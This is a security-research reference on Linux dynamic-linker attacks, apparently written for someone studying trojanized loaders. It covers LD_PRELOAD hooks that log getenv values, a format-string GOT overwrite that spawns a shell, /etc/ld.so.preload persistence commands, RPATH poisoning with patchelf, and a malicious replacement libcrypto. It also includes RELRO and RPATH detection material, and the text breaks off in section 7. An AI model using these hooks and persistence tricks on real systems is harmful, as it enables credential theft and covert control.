# Loader & Linker Level Attacks - Complete Technical Reference

**Author:** Security Research Lab
**Date:** 2025-12-21
**Classification:** Educational / Security Research
**Prerequisites:** Understanding of ELF format, dynamic linking, trojanized loader concepts

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Attack Surface Overview](#2-attack-surface-overview)
3. [LD_PRELOAD Injection](#3-ld_preload-injection)
4. [GOT/PLT Hijacking](#4-gotplt-hijacking)
5. [.init_array / .preinit_array Attacks](#5-init_array--preinit_array-attacks)
6. [DT_RPATH / DT_RUNPATH Poisoning](#6-dt_rpath--dt_runpath-poisoning)
7. [DT_NEEDED Injection](#7-dt_needed-injection)
8. [LD_AUDIT Interface Abuse](#8-ld_audit-interface-abuse)
9. [IFUNC Resolver Hijacking](#9-ifunc-resolver-hijacking)
10. [Comparison Matrix](#10-comparison-matrix)
11. [Detection & Mitigations](#11-detection--mitigations)
12. [Conclusion](#12-conclusion)

---

## 1. Introduction

This document catalogs attack techniques that operate at the **dynamic linker/loader level** of program execution. These attacks share a common characteristic: they execute malicious code **before the target program's `main()` function runs**.

### 1.1 Why This Level Matters

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    PROGRAM EXECUTION TIMELINE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   execve()                                                                  │
│      │                                                                      │
│      ▼                                                                      │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │                    LOADER/LINKER PHASE                               │  │
│   │                                                                      │  │
│   │  ★ ALL ATTACKS IN THIS DOCUMENT EXECUTE HERE ★                       │  │
│   │                                                                      │  │
│   │  1. Kernel loads dynamic linker (ld-linux.so)                        │  │
│   │  2. Linker processes PT_INTERP, DT_NEEDED, DT_RPATH                  │  │
│   │  3. Linker loads shared libraries                                    │  │
│   │  4. Linker runs .preinit_array functions                             │  │
│   │  5. Linker runs library .init_array functions                        │  │
│   │  6. Linker sets up PLT/GOT                                           │  │
│   │  7. Linker runs program .init_array functions                        │  │
│   │                                                                      │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│      │                                                                      │
│      ▼                                                                      │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │                    PROGRAM PHASE                                     │  │
│   │                                                                      │  │
│   │  8. _start → __libc_start_main → main()                              │  │
│   │  9. Program execution                                                │  │
│   │  10. exit() → .fini_array → _exit()                                  │  │
│   │                                                                      │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Relationship to Trojanized Loader Attack

Your trojanized loader attack (PT_INTERP hijacking) modifies the **dynamic linker itself**. The attacks in this document are complementary techniques that abuse:

- Environment variables processed by the linker
- ELF dynamic segment entries
- Initialization function arrays
- Symbol resolution mechanisms

---

## 2. Attack Surface Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DYNAMIC LINKER ATTACK SURFACE                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ENVIRONMENT VARIABLES                    ELF STRUCTURES                   │
│   ─────────────────────                    ──────────────                   │
│   ┌─────────────────────┐                  ┌─────────────────────┐          │
│   │ LD_PRELOAD          │──────────────────│ PT_INTERP           │          │
│   │ LD_LIBRARY_PATH     │                  │ (Trojanized Loader) │          │
│   │ LD_AUDIT            │                  └─────────────────────┘          │
│   │ LD_DEBUG            │                                                   │
│   └─────────────────────┘                  ┌─────────────────────┐          │
│            │                               │ DYNAMIC Segment     │          │
│            │                               │  ├─ DT_NEEDED       │          │
│            ▼                               │  ├─ DT_RPATH        │          │
│   ┌─────────────────────┐                  │  ├─ DT_RUNPATH      │          │
│   │ Processed by        │                  │  ├─ DT_INIT         │          │
│   │ ld-linux.so at      │◄─────────────────│  ├─ DT_INIT_ARRAY   │          │
│   │ program startup     │                  │  ├─ DT_PREINIT_ARR  │          │
│   └─────────────────────┘                  │  └─ DT_SYMTAB       │          │
│            │                               └─────────────────────┘          │
│            │                                                                │
│            ▼                               ┌─────────────────────┐          │
│   ┌─────────────────────┐                  │ .got.plt Section    │          │
│   │ Library Loading     │                  │ (Runtime writable)  │          │
│   │ Symbol Resolution   │─────────────────▶│                     │          │
│   │ Relocation          │                  └─────────────────────┘          │
│   └─────────────────────┘                                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. LD_PRELOAD Injection

### 3.1 Overview

`LD_PRELOAD` is an environment variable that instructs the dynamic linker to load specified shared libraries **before all others**, including libc. Functions defined in preloaded libraries take precedence over standard library functions.

### 3.2 Attack Mechanism

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_PRELOAD INJECTION FLOW                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   $ LD_PRELOAD=/tmp/evil.so ./victim                                        │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 1. Shell calls execve("./victim", ..., envp[])                      │   │
│   │    envp contains: "LD_PRELOAD=/tmp/evil.so"                         │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 2. Kernel loads ld-linux.so (from PT_INTERP)                        │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 3. ld-linux.so reads LD_PRELOAD from environment                    │   │
│   │    Parses: "/tmp/evil.so"                                           │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 4. ld-linux.so loads /tmp/evil.so FIRST                             │   │
│   │    ┌─────────────────────────────────────────────────────────────┐  │   │
│   │    │ evil.so:                                                    │  │   │
│   │    │   .init_array → malicious_init()  ★ RUNS BEFORE MAIN ★      │  │   │
│   │    │   puts() → evil_puts()            ★ REPLACES LIBC ★         │  │   │
│   │    └─────────────────────────────────────────────────────────────┘  │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 5. ld-linux.so loads libc.so.6 (DT_NEEDED)                          │   │
│   │    But evil.so's symbols take PRECEDENCE                            │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 6. Program runs, calls puts("Hello")                                │   │
│   │    → Resolves to evil_puts() instead of libc puts()                 │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.3 Implementation Example

**File: `evil_preload.c`**
```c
/*
 * LD_PRELOAD Injection Example
 *
 * Compile: gcc -shared -fPIC -o evil.so evil_preload.c -ldl
 * Usage:   LD_PRELOAD=./evil.so ./victim
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

/* Constructor - runs before main() */
__attribute__((constructor))
void evil_init(void) {
    FILE *f = fopen("/tmp/PRELOAD_PWNED", "w");
    if (f) {
        fprintf(f, "[LD_PRELOAD] Constructor executed before main()!\n");
        fprintf(f, "PID: %d\n", getpid());
        fclose(f);
    }
}

/* Destructor - runs after main() returns */
__attribute__((destructor))
void evil_fini(void) {
    FILE *f = fopen("/tmp/PRELOAD_PWNED", "a");
    if (f) {
        fprintf(f, "[LD_PRELOAD] Destructor executed after main()!\n");
        fclose(f);
    }
}

/* Hook puts() - intercept all puts calls */
int puts(const char *s) {
    /* Get the real puts from libc */
    int (*real_puts)(const char *);
    real_puts = dlsym(RTLD_NEXT, "puts");

    /* Log the intercepted call */
    FILE *f = fopen("/tmp/PRELOAD_PWNED", "a");
    if (f) {
        fprintf(f, "[HOOK] puts() called with: %s\n", s);
        fclose(f);
    }

    /* Call the real puts */
    return real_puts(s);
}

/* Hook getenv() - steal environment lookups */
char *getenv(const char *name) {
    char *(*real_getenv)(const char *);
    real_getenv = dlsym(RTLD_NEXT, "getenv");

    char *value = real_getenv(name);

    /* Log sensitive environment variable access */
    if (value) {
        FILE *f = fopen("/tmp/PRELOAD_PWNED", "a");
        if (f) {
            fprintf(f, "[HOOK] getenv(\"%s\") = \"%s\"\n", name, value);
            fclose(f);
        }
    }

    return value;
}
```

### 3.4 Attack Scenarios

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_PRELOAD ATTACK SCENARIOS                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SCENARIO 1: Credential Theft                                              │
│   ─────────────────────────────                                             │
│   Hook: getpass(), read(), SSL_read()                                       │
│   Target: SSH clients, sudo, login utilities                                │
│   Result: Capture passwords before encryption                               │
│                                                                             │
│   SCENARIO 2: Network Interception                                          │
│   ────────────────────────────────                                          │
│   Hook: connect(), send(), recv(), SSL_write()                              │
│   Target: Any network application                                           │
│   Result: MITM at application level                                         │
│                                                                             │
│   SCENARIO 3: Privilege Escalation                                          │
│   ────────────────────────────────                                          │
│   Hook: getuid(), geteuid(), getgid()                                       │
│   Target: Programs with SUID checks                                         │
│   Result: Bypass permission checks                                          │
│   NOTE: Doesn't work on SUID binaries (LD_PRELOAD ignored)                  │
│                                                                             │
│   SCENARIO 4: Persistence                                                   │
│   ────────────────────────────                                              │
│   Add to: /etc/ld.so.preload (requires root)                                │
│   Result: Affects ALL dynamically linked programs                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.5 Security Restrictions

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_PRELOAD SECURITY RESTRICTIONS                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   The dynamic linker IGNORES LD_PRELOAD when:                               │
│                                                                             │
│   1. Binary has SUID/SGID bit set                                           │
│      └─ Prevents privilege escalation                                       │
│                                                                             │
│   2. Binary has capabilities (getcap shows +ep)                             │
│      └─ Same protection as SUID                                             │
│                                                                             │
│   3. Real UID != Effective UID                                              │
│      └─ AT_SECURE auxv flag is set                                          │
│                                                                             │
│   4. Library path doesn't exist or isn't readable                           │
│                                                                             │
│   BYPASS: /etc/ld.so.preload                                                │
│   ──────────────────────────────                                            │
│   Root can add libraries to /etc/ld.so.preload                              │
│   This file is ALWAYS processed, even for SUID binaries!                    │
│                                                                             │
│   $ echo "/tmp/evil.so" >> /etc/ld.so.preload                               │
│   $ /usr/bin/sudo -l   # evil.so loaded even though sudo is SUID            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. GOT/PLT Hijacking

### 4.1 Overview

The Global Offset Table (GOT) and Procedure Linkage Table (PLT) enable lazy symbol resolution. Since GOT entries are **writable at runtime**, overwriting them redirects function calls to attacker-controlled code.

### 4.2 PLT/GOT Architecture Review

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    PLT/GOT STRUCTURE                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   YOUR CODE               PLT (Read-Execute)        GOT (Read-Write)        │
│   ──────────              ──────────────────        ────────────────        │
│                                                                             │
│   main:                   puts@plt:                 puts@got:               │
│     ...                     jmp [puts@got] ────────▶ 0x7ffff7e5e420        │
│     call puts@plt ─────▶    push 0                   (libc puts addr)       │
│     ...                     jmp resolver                                    │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   NORMAL FLOW:                                                              │
│   ────────────                                                              │
│   1. call puts@plt                                                          │
│   2. jmp [puts@got]                                                         │
│   3. GOT contains address of real puts() in libc                            │
│   4. Execution continues in libc puts()                                     │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   HIJACKED FLOW:                                                            │
│   ──────────────                                                            │
│   1. Attacker overwrites GOT entry: puts@got = 0x401234                     │
│   2. call puts@plt                                                          │
│   3. jmp [puts@got]                                                         │
│   4. GOT contains attacker's address!                                       │
│   5. Execution jumps to attacker's evil_puts() at 0x401234                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 4.3 Attack Mechanism

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    GOT OVERWRITE ATTACK                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   REQUIREMENTS:                                                             │
│   ─────────────                                                             │
│   1. Arbitrary write primitive (buffer overflow, format string, etc.)       │
│   2. Knowledge of GOT location (leak or predictable with no ASLR)           │
│   3. Address of malicious function or gadget                                │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   STEP 1: Identify Target GOT Entry                                         │
│   ──────────────────────────────────                                        │
│                                                                             │
│   $ objdump -R ./victim | grep puts                                         │
│   0000000000404018  R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5                     │
│                                                                             │
│   GOT entry for puts() is at 0x404018                                       │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   STEP 2: Find Target Address                                               │
│   ───────────────────────────                                               │
│                                                                             │
│   Options:                                                                  │
│   a) Address of win() function in binary                                    │
│   b) One-gadget in libc (requires libc leak)                                │
│   c) ROP gadget chain start                                                 │
│   d) Shellcode location (if executable)                                     │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   STEP 3: Overwrite GOT Entry                                               │
│   ───────────────────────────                                               │
│                                                                             │
│   Using format string vulnerability:                                        │
│   payload = p64(0x404018) + b"%NNNNc%N$n"                                    │
│                                                                             │
│   Using buffer overflow with arbitrary write:                               │
│   *(uint64_t *)0x404018 = 0x401234;  // Overwrite puts@got                  │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   STEP 4: Trigger the Hijacked Function                                     │
│   ──────────────────────────────────────                                    │
│                                                                             │
│   Next time program calls puts():                                           │
│   puts("Hello");  // Actually calls evil_function() at 0x401234!            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 4.4 GOT Overwrite Example (Format String)

```c
/*
 * Vulnerable program with format string vulnerability
 *
 * Compile: gcc -no-pie -o vuln_got vuln_got.c
 */

#include <stdio.h>
#include <stdlib.h>

void win(void) {
    printf("[WIN] GOT hijack successful!\n");
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    char buffer[256];

    printf("Enter input: ");
    fgets(buffer, sizeof(buffer), stdin);

    /* VULNERABILITY: User input used as format string */
    printf(buffer);  // Format string vulnerability!

    /* This puts() call will be hijacked */
    puts("Goodbye!");

    return 0;
}

/*
 * Exploitation:
 *
 * 1. Find puts@got: objdump -R ./vuln_got | grep puts
 *    → 0x404018
 *
 * 2. Find win() address: objdump -t ./vuln_got | grep win
 *    → 0x401186
 *
 * 3. Craft format string to write 0x401186 to 0x404018
 *    → Complex format string with %n writes
 *
 * 4. When puts("Goodbye!") is called, win() executes instead
 */
```

### 4.5 Mitigations

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    GOT/PLT PROTECTIONS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   RELRO (Relocation Read-Only)                                              │
│   ────────────────────────────                                              │
│                                                                             │
│   Partial RELRO (default):                                                  │
│   ├─ .got is read-only after relocation                                     │
│   ├─ .got.plt remains WRITABLE (for lazy binding)                           │
│   └─ gcc -Wl,-z,relro                                                       │
│                                                                             │
│   Full RELRO:                                                               │
│   ├─ ALL GOT entries resolved at load time                                  │
│   ├─ Entire GOT marked READ-ONLY                                            │
│   ├─ No lazy binding (slower startup)                                       │
│   └─ gcc -Wl,-z,relro,-z,now                                                │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   Checking RELRO Status:                                                    │
│   ──────────────────────                                                    │
│                                                                             │
│   $ checksec --file=./binary                                                │
│   RELRO:    Partial RELRO    ← Vulnerable                                   │
│   RELRO:    Full RELRO       ← Protected                                    │
│                                                                             │
│   $ readelf -l ./binary | grep GNU_RELRO                                    │
│   GNU_RELRO      0x002e10 ...                                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 5. .init_array / .preinit_array Attacks

### 5.1 Overview

ELF binaries contain initialization arrays that hold function pointers. The dynamic linker calls these functions **before `main()`** runs. Injecting pointers into these arrays achieves pre-main code execution.

### 5.2 Initialization Order

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    INITIALIZATION SEQUENCE                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   execve("./program")                                                       │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 1. Kernel loads ld-linux.so                                        │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 2. ld-linux.so loads shared libraries (libc, etc.)                 │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 3. .preinit_array functions (PROGRAM ONLY, not libraries)          │    │
│   │    ★ EARLIEST USER-CONTROLLED EXECUTION ★                          │    │
│   │    Runs before ANY library initialization                          │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 4. Library .init_array functions                                   │    │
│   │    Each loaded library's constructors run                          │    │
│   │    Order: dependency order (libc first, then others)               │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 5. Program .init_array functions                                   │    │
│   │    __attribute__((constructor)) functions                          │    │
│   │    ★ COMMON INJECTION TARGET ★                                     │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 6. _start → __libc_start_main → main()                             │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 7. Program execution                                               │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   ┌────────────────────────────────────────────────────────────────────┐    │
│   │ 8. exit() → .fini_array → _exit()                                  │    │
│   │    Destructor functions run in reverse order                       │    │
│   └────────────────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.3 ELF Section Structure

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    INIT ARRAY SECTIONS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   $ readelf -S ./binary | grep -E "init|fini"                               │
│                                                                             │
│   [18] .init_array    INIT_ARRAY    0x403e10  0x2e10  0x10  00  WA  0  0  8 │
│   [19] .fini_array    FINI_ARRAY    0x403e20  0x2e20  0x08  00  WA  0  0  8 │
│                                                                             │
│   .init_array layout:                                                       │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ Offset    Value              Meaning                                │   │
│   ├─────────────────────────────────────────────────────────────────────┤   │
│   │ 0x403e10  0x0000000000401150  First constructor function ptr        │   │
│   │ 0x403e18  0x0000000000401180  Second constructor function ptr       │   │
│   │ ...                                                                 │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Dynamic segment entries:                                                  │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ DT_INIT_ARRAY     0x403e10    Address of .init_array                │   │
│   │ DT_INIT_ARRAYSZ   0x10        Size in bytes (2 pointers)            │   │
│   │ DT_PREINIT_ARRAY  (optional)  For executables only                  │   │
│   │ DT_FINI_ARRAY     0x403e20    Address of .fini_array                │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.4 Attack Methods

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    .init_array ATTACK VECTORS                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   METHOD 1: Binary Patching                                                 │
│   ─────────────────────────                                                 │
│   Directly modify .init_array in the ELF file:                              │
│                                                                             │
│   $ objcopy --add-section .evil_init=payload.bin ./binary                   │
│   $ objcopy --update-section .init_array=new_array.bin ./binary             │
│                                                                             │
│   Or patch with hex editor / Python script:                                 │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ # Find .init_array offset                                           │   │
│   │ offset = 0x2e10  # from readelf                                     │   │
│   │                                                                     │   │
│   │ # Prepend our malicious function pointer                            │   │
│   │ evil_ptr = struct.pack("<Q", 0x401234)  # Address of evil code      │   │
│   │ binary[offset:offset+8] = evil_ptr                                  │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   METHOD 2: Runtime Overwrite                                               │
│   ───────────────────────────                                               │
│   If you have arbitrary write before init functions run:                    │
│                                                                             │
│   1. Overwrite a pointer in .init_array                                     │
│   2. Linker will call your address as constructor                           │
│                                                                             │
│   Challenge: .init_array runs early, limited exploitation window            │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   METHOD 3: .fini_array for Persistence                                     │
│   ─────────────────────────────────────                                     │
│   Overwrite .fini_array to run code at exit:                                │
│                                                                             │
│   1. Find .fini_array address (writable before Full RELRO)                  │
│   2. Overwrite with shellcode/function address                              │
│   3. Code runs when program exits normally                                  │
│                                                                             │
│   Useful for: cleanup evasion, delayed payload, exfiltration                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.5 Creating Constructor/Destructor Functions

```c
/*
 * Demonstration of constructor/destructor attributes
 * These are compiled into .init_array and .fini_array
 */

#include <stdio.h>

/* Multiple constructors with priority */
__attribute__((constructor(101)))
void early_init(void) {
    printf("[INIT 101] Early initialization\n");
}

__attribute__((constructor(102)))
void normal_init(void) {
    printf("[INIT 102] Normal initialization\n");
}

__attribute__((constructor))  /* Default priority: 65535 */
void late_init(void) {
    printf("[INIT default] Late initialization\n");
}

/* Destructors run in reverse order */
__attribute__((destructor))
void cleanup(void) {
    printf("[FINI] Cleanup\n");
}

int main(void) {
    printf("[MAIN] Program running\n");
    return 0;
}

/*
 * Output:
 * [INIT 101] Early initialization
 * [INIT 102] Normal initialization
 * [INIT default] Late initialization
 * [MAIN] Program running
 * [FINI] Cleanup
 */
```

---

## 6. DT_RPATH / DT_RUNPATH Poisoning

### 6.1 Overview

`DT_RPATH` and `DT_RUNPATH` are ELF dynamic section entries that specify library search paths. By manipulating these paths, an attacker can force the loader to load malicious libraries instead of legitimate ones.

### 6.2 Library Search Order

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LIBRARY SEARCH ORDER                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   When resolving a library like "libc.so.6", ld-linux searches:             │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 1. DT_RPATH (deprecated, but still works)                           │   │
│   │    Embedded in binary, searched FIRST                               │   │
│   │    $ readelf -d ./binary | grep RPATH                               │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 2. LD_LIBRARY_PATH (environment variable)                           │   │
│   │    Ignored for SUID/SGID binaries                                   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 3. DT_RUNPATH                                                       │   │
│   │    Modern replacement for DT_RPATH                                  │   │
│   │    $ readelf -d ./binary | grep RUNPATH                             │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 4. /etc/ld.so.cache                                                 │   │
│   │    Cached paths from ldconfig                                       │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 5. Default paths: /lib, /usr/lib, etc.                              │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   SPECIAL TOKEN: $ORIGIN                                                    │
│   ──────────────────────                                                    │
│   Expands to directory containing the executable                            │
│   Useful for relocatable applications                                       │
│                                                                             │
│   DT_RUNPATH: $ORIGIN/../lib                                                │
│   If binary at /opt/app/bin/prog, searches /opt/app/lib                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 6.3 Attack Mechanism

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DT_RPATH/DT_RUNPATH POISONING                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ATTACK SCENARIO 1: Patch Binary's RPATH                                   │
│   ───────────────────────────────────────                                   │
│                                                                             │
│   Original binary:                                                          │
│   $ readelf -d ./victim | grep PATH                                         │
│   (none)                                                                    │
│                                                                             │
│   Patched binary:                                                           │
│   $ patchelf --set-rpath /tmp/evil:$ORIGIN ./victim                         │
│   $ readelf -d ./victim | grep PATH                                         │
│   0x000000000000001d (RUNPATH)  Library runpath: [/tmp/evil:$ORIGIN]        │
│                                                                             │
│   Attack:                                                                   │
│   $ cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/evil/                           │
│   $ # Inject malicious code into the copied libc                            │
│   $ ./victim  # Loads /tmp/evil/libc.so.6 first!                            │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   ATTACK SCENARIO 2: $ORIGIN Abuse                                          │
│   ─────────────────────────────────                                         │
│                                                                             │
│   If binary has: DT_RUNPATH = $ORIGIN/lib                                   │
│                                                                             │
│   And attacker can:                                                         │
│   1. Create symlink to binary from attacker-controlled directory            │
│   2. Place evil library in that directory's /lib subdirectory               │
│                                                                             │
│   $ ln -s /usr/bin/target /tmp/evil/target                                  │
│   $ mkdir /tmp/evil/lib                                                     │
│   $ cp evil_libfoo.so /tmp/evil/lib/libfoo.so.1                             │
│   $ /tmp/evil/target   # $ORIGIN = /tmp/evil, loads evil lib!               │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   ATTACK SCENARIO 3: Writable RPATH Directory                               │
│   ────────────────────────────────────────────                              │
│                                                                             │
│   If binary has: DT_RPATH = /opt/app/lib:/usr/lib                           │
│   And /opt/app/lib is world-writable:                                       │
│                                                                             │
│   $ cp evil.so /opt/app/lib/libcrypto.so.1.1                                │
│   $ /opt/app/bin/server  # Loads evil libcrypto!                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 6.4 Creating a Malicious Library

```c
/*
 * evil_lib.c - Malicious library for RPATH poisoning
 *
 * Compile to replace a specific library, e.g., libcrypto:
 * gcc -shared -fPIC -o libcrypto.so.1.1 evil_lib.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

/* Constructor runs when library is loaded */
__attribute__((constructor))
void evil_init(void) {
    /* Avoid recursion if we're loaded by our own shell command */
    if (getenv("EVIL_LOADED")) return;
    setenv("EVIL_LOADED", "1", 1);

    /* Malicious payload */
    FILE *f = fopen("/tmp/RPATH_PWNED", "w");
    if (f) {
        fprintf(f, "[RPATH POISON] Library loaded!\n");
        fprintf(f, "PID: %d\n", getpid());
        fprintf(f, "Binary: ");

        /* Read /proc/self/exe to identify victim */
        char exe[256];
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe)-1);
        if (len > 0) {
            exe[len] = '\0';
            fprintf(f, "%s\n", exe);
        }
        fclose(f);
    }

    /* Load real library and continue */
    void *real_lib = dlopen("/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1",
                            RTLD_NOW | RTLD_GLOBAL);
    if (!real_lib) {
        fprintf(stderr, "Failed to load real library\n");
    }
}

/* Export stub functions that forward to real library */
/* This would require implementing all exported symbols */
```

### 6.5 Detection

```bash
# Find binaries with RPATH/RUNPATH set
find /usr/bin /usr/sbin -type f -executable -exec sh -c '
    readelf -d "$1" 2>/dev/null | grep -q "RPATH\|RUNPATH" && echo "$1"
' _ {} \;

# Check for dangerous $ORIGIN usage
readelf -d /path/to/binary | grep -E "RPATH|RUNPATH" | grep '\$ORIGIN'

# Verify RPATH directories are not world-writable
for dir in $(readelf -d /binary | grep RPATH | sed 's/.*\[//;s/\].*//' | tr ':' '\n'); do
    [ -w "$dir" ] && echo "WRITABLE: $dir"
done
```

---

## 7. DT_NEEDED Injection

### 7.1 Overview

`DT_NEEDED` entries in the ELF dynamic section specify shared libraries that must be loaded. By adding a malicious library to this list, the loader automatically loads and initializes attacker code.

### 7.2 How DT_NEEDED Works

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DT_NEEDED PROCESSING                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   $ readelf -d /bin/ls | grep NEEDED                                        │
│                                                                             │
│   0x0000000000000001 (NEEDED)  Shared library: [libselinux.so.1]            │
│   0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]                  │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   LOADING SEQUENCE:                                                         │
│   ─────────────────                                                         │
│                                                                             │
│   1. Linker reads DYNAMIC segment                                           │
│        │                                                                    │
│        ▼                                                                    │
│   2. For each DT_NEEDED entry (in order):                                   │
│      ┌────────────────────────────────────────────────────────────────┐     │
│      │ a. Search library paths (RPATH → LD_LIBRARY_PATH → RUNPATH)   │     │
│      │ b. Load library into memory                                    │     │
│      │ c. Process library's DT_NEEDED (recursive)                     │     │
